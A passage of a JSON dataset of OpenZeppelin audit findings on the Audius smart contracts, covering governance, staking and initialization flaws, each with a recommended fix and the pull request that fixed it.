      "content": "When a new governance proposal is submitted, it requires a [description](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L159). This description is not saved to the contract storage, only to the events log when [`ProposalSubmitted`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L210) is `emitted`.\n\n\nThis makes it hard for a user of the contract to get the description. They would have to gather this information from the logs, which are not accessible to other on-chain contracts.\n\n\nConsider saving the description in the contract storage, together with the rest of the [proposal information](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L58).\n\n\n***Update:** Fixed in [pull request #550](https://github.com/AudiusProject/audius-protocol/pull/550).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11333",
      "title": "[M10] Some state variables are not set during initialize",
      "impact": "MEDIUM",
      "content": "The Audius contracts can be upgraded using the [unstructured storage proxy pattern](https://docs.openzeppelin.com/upgrades/2.8/proxies). This pattern requires the use of an initializer instead of the constructor to set the initial values of the state variables. In some of the contracts, the initializer is not initializing all of the state variables.\n\n\nFor example, in the [`initializer` function of the `ClaimsManager` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L78) the [`stakingAddress` state variable](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L17) is not set. It can be set later by calling [`setStakingAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L163). However, this means that it is possible to call the [`processClaim` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L227) and some others without any staking address set, because they only [check that the contract has been initialized](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L232).\n\n\nThe same happens in the [`initializer` function of the `Governance` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L122), which does not set the [`stakingAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L20) either.\n\n\nConsider setting all the required variables in the initializer. If there is a reason for leaving them uninitialized consider documenting it, and adding checks on the functions that use those variables to ensure that they are not called before initialization.\n\n\n***Update**: Fixed in [pull request #589](https://github.com/AudiusProject/audius-protocol/pull/589).*",
      "summary": "\nThis bug report is about the Audius contracts, which can be upgraded using the unstructured storage proxy pattern. This pattern requires the use of an initializer instead of the constructor to set the initial values of the state variables. In some of the contracts, the initializer is not initializing all of the state variables, such as the `stakingAddress` state variable in the `ClaimsManager` and `Governance` contracts. This means that it is possible to call functions without any staking address set, as they only check that the contract has been initialized.\n\nThe solution is to set all the required variables in the initializer. If there is a reason for leaving them uninitialized, the developer should document it and add checks on the functions that use those variables to ensure that they are not called before initialization. This bug has been fixed in pull request #589.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11332",
      "title": "[M09] Ties in governance proposals are approved",
      "impact": "MEDIUM",
      "content": "When the [stake in favor a governance proposal is equal to the stake against it](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L371), the proposal is considered approved and can be executed. In cases when critical updates to the system are so contentious to the point of reaching a tie, the safest course of action is to prepare a new proposal that can be discussed further and be more easily approved later.\n\n\nConsider executing proposals only when they have a majority of supporting votes.\n\n\n***Update:** Fixed in [pull request #576](https://github.com/AudiusProject/audius-protocol/pull/576).*",
      "summary": "\nThis bug report is about a governance proposal in the Audius protocol which is a decentralized platform for streaming music. The issue is that when the stake in favor of a governance proposal is equal to the stake against it, the proposal is considered approved and can be executed. This can be a problem if the proposal is too contentious, as it could cause major issues if it is executed without a majority of supporting votes. The issue has now been fixed in pull request #576.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11331",
      "title": "[M08] Service providers and delegators can mistakenly soft-lock their own stake",
      "impact": "MEDIUM",
      "content": "If a service provider calls the [`requestDecreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364) and passes in a `_decreaseStakeAmount` of `0`, the call will succeed and a `DecreaseStakeRequest` will be queued up.\n\n\nIf the service provider then attempts to cancel that request using the [`cancelDecreaseStakeRequest` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L396), the call will revert at [line 402](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L402) because the [`_decreaseRequestIsPending` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L793) returns `false` when `decreaseStakeRequests[_serviceProvider].decreaseAmount = 0`.\n\n\nIf the service provider tries to call the [`decreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L416), the call will revert at [line 420](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L420) for the same reason.\n\n\nTo get out of this “soft-lock” situation, the service provider must call the [`requestDecreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364) again, passing in a `_decreaseStakeAmount` greater than `0`, and then cancel that new `DecreaseStakeRequest`. This is outside the normal UX flow and may not be easy to discover.\n\n\nSimilarly, if a delegator calls the [`requestUndelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L183) and passes in an `_amount` of `0`, the call will succeed and a `UndelegateStakeRequest` will be queued up.\n\n\nIf the delegator then attempts to cancel that request using the [`cancelUndelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L222), the call will revert at [line 226](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L226) because the [`_undelegateRequestIsPending` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L772) returns `false` when `undelegateRequests[_delegator].amount == 0`.\n\n\nIf the delegator tries to call the [`undelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L239), the call will revert at [line 244](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L244) for the same reason.\n\n\nTo get out of this “soft-lock” situation, the delegator must call the [`requestUndelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L183) again, passing in an `_amount` greater than `0`, and then cancel that new `UndelegateStakeRequest`. As before, this is outside the normal UX flow and may not be easy to discover.\n\n\nConsider requiring that the `requestDecreaseStake` only accepts a `_decreaseStakeAmount` greater than zero, and consider requiring that the `requestUndelegateStake` function only accepts an `_amount` greater than `0`.\n\n\n***Update:** Fixed in [pull request #567](https://github.com/AudiusProject/audius-protocol/pull/567).*",
      "summary": "\nThis bug report discusses a problem with two functions in the Audius protocol, the `requestDecreaseStake` and `requestUndelegateStake` functions. If either of these functions are given an amount of 0, the call will succeed and a request will be queued up. However, when the user attempts to cancel the request, the call will revert. This results in a “soft-lock” situation where the user is unable to move forward. \n\nThe only way to get out of this soft-lock is for the user to call the same function again with an amount greater than 0, and then cancel the new request. This is outside the normal user experience and may not be easy to discover.\n\nThe report suggests that the functions should be modified so that they only accept amounts greater than 0. This issue has since been fixed in pull request #567.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11330",
      "title": "[M07] Semantic overloading in the No outcome of proposals",
      "impact": "MEDIUM",
      "content": "When a proposal fails to meet support of the majority of stake, its [outcome is set to `No`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L395). Also, when a proposal is vetoed by the guardian account, its [outcome is set to `No`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L434).\n\n\nThis is a [semantic overload](https://forum.openzeppelin.com/t/watch-out-for-semantic-overloading/1088), giving the `No` outcome two different meanings. It could be confusing for callers of these contracts and may open the door to regressions in future updates to the code.\n\n\nConsider adding an extra `Veto` outcome, to clearly differentiate between the two states.\n\n\n***Update:** Fixed in [pull request #579](https://github.com/AudiusProject/audius-protocol/pull/579).*",
      "summary": "\nThis bug report is about an issue in the Audius Protocol code. When a proposal fails to meet the support of the majority of stakeholders or is vetoed by the guardian account, its outcome is set to `No`. This is a semantic overload, meaning that the `No` outcome has two different meanings. This is confusing for callers of these contracts and may lead to future regressions.\n\nTo solve this issue, it is suggested to add an extra `Veto` outcome, to clearly differentiate between the two states. This issue has been resolved in pull request #579.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11329",
      "title": "[M06] Voting period and quorum can be set to zero",
      "impact": "MEDIUM",
      "content": "When the `Governance` contract is initialized, the values of [`votingPeriod`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L132) and [`votingQuorum`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L135) are checked to make sure that they are greater than 0. However, the corresponding setter functions [`setVotingPeriod`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L457) and [`setVotingQuorum`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L467) allow these to variables to be reset to 0.\n\n\nSetting the `votingPeriod` to zero would cause spurious proposals that cannot be voted. Setting the `quorum` to zero is worse because it would allow proposals with 0 votes to be executed.\n\n\nConsider adding the validation to the setter functions.\n\n\n***Update:** Fixed in [pull request #568](https://github.com/AudiusProject/audius-protocol/pull/568).*",
      "summary": "\nThis bug report is about the `Governance` contract of the Audius protocol. The contract is initialized with two variables, `votingPeriod` and `votingQuorum`, which are both checked to make sure that they are greater than 0. However, the corresponding setter functions, `setVotingPeriod` and `setVotingQuorum`, allow these two variables to be reset to 0. \n\nSetting the `votingPeriod` to zero would cause spurious proposals that cannot be voted on. Setting the `quorum` to zero is worse because it would allow proposals with 0 votes to be executed. The bug report suggests adding validation to the setter functions to prevent this from happening.\n\nThe bug has since been fixed in pull request #568.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11328",
      "title": "[M05] Only active stakers can evaluate proposals",
      "impact": "MEDIUM",
      "content": "When a vote is complete, an account with active stake at the time the proposal was submitted has to call the [`evaluateProposalOutcome` function of the `Governance`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L316) contract.\n\n\nThis function requires nothing specific from a staker, so it is not clear why this caller limitation is implemented. If no staker is interested in evaluating the proposal, then this prevents other potentially interested accounts to do the evaluation.\n\n\nConsider allowing any account to evaluate proposals. Alternatively, if there is a reason why this action has to be limited to stakers, consider documenting it.\n\n\n***Update:** Fixed in pull requests [#572](https://github.com/AudiusProject/audius-protocol/pull/572) and [#585](https://github.com/AudiusProject/audius-protocol/pull/585). Now any account can evaluate proposals.*",
      "summary": "\nThis bug report is about the Audius Protocol, an open-source project. It states that when a vote is complete, an account with active stake at the time the proposal was submitted has to call the `evaluateProposalOutcome` function of the `Governance` contract. This function requires nothing specific from a staker, so it is not clear why this limitation is implemented. As a result, if no staker is interested in evaluating the proposal, then this prevents other potentially interested accounts from doing so. \n\nThe bug report suggests that either any account should be allowed to evaluate proposals or the reason for this limitation should be documented. The bug has since been fixed in pull requests #572 and #585, which now allows any account to evaluate proposals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11327",
      "title": "[M04] Lack of input validation",
      "impact": "MEDIUM",
      "content": "The [`upgradeContract` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/registry/Registry.sol#L80) in the `Registry` contract does not check if the `_newAddress` is the zero address. If passed the zero address, the function will perform the same functionality as the [`removeContract` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/registry/Registry.sol#L61) but emit a `ContractUpgraded` event.\n\n\nThe [`setServiceVersion` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L180) in the `ServiceTypeManager` contract does not check if the inputted `_serviceType` type exists, allowing callers to add versions to a nonexistent service type.\n\n\nThe [`updateServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L123) in the `ServiceTypeManager` contract does not check if the new `_serviceTypeMax` is zero or not (which would make the `serviceTypeIsValid` function always return `false`, even for valid service types), or if `_serviceTypeMax < _serviceTypeMin` (which would break endpoint registration and deregistration).\n\n\nThe [`setGovernanceAddress` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L57) in the `ServiceTypeManager` contract does not check if the new `_governanceAddress` corresponds to a real governance address (for example, by calling an `isGovernanceAddress` function on the `_governanceAddress` contract). If the `_governanceAddress` is set to an incorrect address, control over the contracts may be permanently lost.\n\n\nThe [`addServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L71) in the `ServiceTypeManager` contract does not enforce that `_serviceTypeMax > 0`. This means it is possible to add the same service type to the `validServiceTypes` array multiple times.\n\n\nThe [`setVotingPeriod` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L457) in the `Governance` contract does not check if the `_votingPeriod` is zero. If it is, then it would not be possible to vote on any future proposal.\n\n\nConsider adding input checks to each of these functions to reduce possible errors.\n\n\n***Update:** Fixed in [pull request #569](https://github.com/AudiusProject/audius-protocol/pull/569). Checks were added for each of the reported occurrences. For the one found in the `addServiceType` function, the `ServiceTypeManager` contract does not explicitly enforce that `_serviceTypeMax` has to be bigger than zero, nevertheless, it needs to be bigger than the `_serviceTypeMin` variable, which cannot be inferior than zero.*",
      "summary": "\nThis bug report outlines six issues with the `Registry`, `ServiceTypeManager`, and `Governance` contracts in the Audius protocol. The `upgradeContract` function in the `Registry` contract does not check if the `_newAddress` is the zero address. The `setServiceVersion` function in the `ServiceTypeManager` contract does not check if the inputted `_serviceType` type exists. The `updateServiceType` function in the `ServiceTypeManager` contract does not check if the new `_serviceTypeMax` is zero or not or if `_serviceTypeMax < _serviceTypeMin`. The `setGovernanceAddress` function in the `ServiceTypeManager` contract does not check if the new `_governanceAddress` corresponds to a real governance address. The `addServiceType` function in the `ServiceTypeManager` contract does not enforce that `_serviceTypeMax > 0`. The `setVotingPeriod` function in the `Governance` contract does not check if the `_votingPeriod` is zero.\n\nIt is recommended to add input checks to each of these functions to reduce possible errors. The issues have since been fixed in pull request #569, where checks were added for each of the reported occurrences.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11326",
      "title": "[M03] Lack of event emission after sensitive changes",
      "impact": "MEDIUM",
      "content": "In several parts of the code there are sensitive functions that lack event emissions. This can make it difficult for users to be aware of important changes that take place.\n\n\nHere are some examples:\n\n\n* The [`processClaim` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L263) in the `ClaimsManager` contract does not emit an event [in the case where there are no rewards](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L263).\n* The [`setGovernanceAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L153), [`setStakingAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L163), [`setServiceProviderFactoryAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L173), [`setDelegateManagerAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L183), [`updateFundingAmount`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L295), and [`updateFundingRoundBlockDiff`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ClaimsManager.sol#L324) functions from the `ClaimsManager` contract do not emit events.\n* The [`addServiceType`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L71) and [`removeServiceType`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L93) functions from the `ServiceTypeManager` contract do not emit events.\n* The [`updateDelegateOwnerWallet`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L467), [`updateEndpoint`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L488), [`updateServiceProviderCut`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L546), and [`updateDecreaseStakeLockupDuration`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L562) functions from the `ServiceProviderManager` contract do not emit events.\n\n\nConsider adding events in these cases to make it easier to track important contract changes.\n\n\n***Update:** Fixed in [pull request #583](https://github.com/AudiusProject/audius-protocol/pull/583).*",
      "summary": "\nThis bug report concerns the lack of event emissions in several parts of the code. Event emissions are important because they allow users to be aware of important changes that take place. The report provides examples of functions from the `ClaimsManager`, `ServiceTypeManager`, and `ServiceProviderFactory` contracts that do not emit events. It is suggested that events should be added to these functions to make it easier to track important contract changes. The issue has since been fixed in pull request #583.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11325",
      "title": "[M02] Inconsistently checking initialization",
      "impact": "MEDIUM",
      "content": "When a contract is initialized, its [`isInitialized` state variable is set to `true`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/InitializableV2.sol#L19). Since interacting with uninitialized contracts would cause problems, the [`_requireIsInitialized`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/InitializableV2.sol#L22) function is available to make this check.\n\n\nHowever, this check is not used consistently. For example, it is used in the [`getVotingQuorum` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L636) of the `Governance` contract, but it is not used in the [`getRegistryAddress`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol#L642) function of the same contract. There is no obvious difference between the functions to explain this difference, and it could be misleading and cause uninitialized contracts to be called.\n\n\nConsider calling `_requireIsInitialized` consistently in all the functions of the `InitializableV2` contracts. If there is a reason to not call it in some functions, consider documenting it. Alternatively, consider removing this check altogether and preparing a good deployment script that will ensure that all contracts are initialized in the same transaction that they are deployed. In this alternative, it would be required to check that contracts resulting from new proposals are also initialized before they are put in production.\n\n\n***Update:** Fixed in pull requests [#587](https://github.com/AudiusProject/audius-protocol/pull/587) and [#594](https://github.com/AudiusProject/audius-protocol/pull/594). The `_requireIsInitialized` check has been added to all the externally accessed functions of contracts that inherit from `InitializableV2`.*",
      "summary": "\nThis bug report is about the inconsistent use of the `_requireIsInitialized` function in the `InitializableV2` contracts. The `_requireIsInitialized` function is used to set the `isInitialized` state variable to `true` when a contract is initialized. However, this function is not used consistently and could result in uninitialized contracts being called.\n\nTo fix this bug, the `_requireIsInitialized` check should be called consistently in all the functions of the `InitializableV2` contracts. If there is a reason to not call it in some functions, it should be documented. Alternatively, the check should be removed and a good deployment script should be prepared to ensure that all contracts are initialized in the same transaction that they are deployed.\n\nThis bug has been fixed in pull requests #587 and #594. The `_requireIsInitialized` check has been added to all the externally accessed functions of contracts that inherit from `InitializableV2`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11324",
      "title": "[M01] Complicated state updates",
      "impact": "MEDIUM",
      "content": "When stake balances are modified (through [`delegateStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L116), [`requestUndelegateStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L183), [`cancelUndelegateStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L222), [`undelegateStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L239), and [`slash`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L432)), multiple operations are executed to increase or decrease the values of the state variables related to the updated stake status. This is error prone, as shown by the critical issue *“A malicious delegator can permanently lock all stake and rewards for a victim service provider and all of its honest delegators”* where one of the values was not correctly updated.\n\n\nA similar pattern is implemented to track the number of votes for [`Governance`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/Governance.sol) proposals.\n\n\nConsider encapsulating these operations into separate functions, one for each type of state update. This way it will be clearer to review that the operations are complete, consistent, and complementary. Some duplication can be removed, and these functions can be thoroughly tested in isolation.\n\n\nConsider [formal verification](https://en.wikipedia.org/wiki/Formal_verification) to prove that these critical state variables will always behave as expected and keep the system in a consistent state.\n\n\n***Update:** Fixed in [pull request #539](https://github.com/AudiusProject/audius-protocol/pull/539). Most of the logic was encapsulated in new internal functions, such as the [`_updateDelegatorStake`](https://github.com/AudiusProject/audius-protocol/blob/e16dd3e8af4587bacad902bb66a718b60658b972/eth-contracts/contracts/DelegateManager.sol#L150) and the [`_updateServiceProviderLockupAmount`](https://github.com/AudiusProject/audius-protocol/blob/e16dd3e8af4587bacad902bb66a718b60658b972/eth-contracts/contracts/DelegateManager.sol#L813) functions of the `DelegateManager` contract, and the [`_decreaseVoteMagnitudeNo`](https://github.com/AudiusProject/audius-protocol/blob/e16dd3e8af4587bacad902bb66a718b60658b972/eth-contracts/contracts/Governance.sol#L689) and the [`_increaseVoteMagnitudeYes`](https://github.com/AudiusProject/audius-protocol/blob/e16dd3e8af4587bacad902bb66a718b60658b972/eth-contracts/contracts/Governance.sol#L671) functions of the `Governance` contract.*",
      "summary": "\nThis bug report is about a critical issue that arises when stake balances are modified. It was found that when multiple operations are executed to increase or decrease the values of the state variables related to the updated stake status, the system becomes error prone and can lead to a malicious delegator permanently locking all stake and rewards for a victim service provider and all of its honest delegators. The report also mentions that a similar pattern is implemented to track the number of votes for Governance proposals.\n\nThe report suggests encapsulating these operations into separate functions, one for each type of state update. This way it will be easier to review that the operations are complete, consistent, and complementary. It also suggests formal verification to prove that these critical state variables will always behave as expected and keep the system in a consistent state.\n\nThe issue was fixed in pull request #539. Most of the logic was encapsulated in new internal functions. These functions were thoroughly tested in isolation and the issue was resolved.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11323",
      "title": "[H12] Unresponsive service provider locks delegator stake",
      "impact": "HIGH",
      "content": "A service provider may become unresponsive (e.g., by losing their keys, dying, etc.). If this happens, the service provider will not call the [`claimRewards` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L327). After one week the [`_claimPending` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L763) will always return `true`. So delegators will not be able to undelegate their stake because the [`undelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L239) will revert [on line 252](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L252).\n\n\nConsider refactoring the `claimRewards` function to allow anyone can call it — passing in a service provider address as a parameter. This way, the rewards-claiming process can be moved forward by anyone, not just the service provider. This would protect delegators from an unresponsive service provider.\n\n\n***Update:** Fixed in [pull request #556](https://github.com/AudiusProject/audius-protocol/pull/556).*",
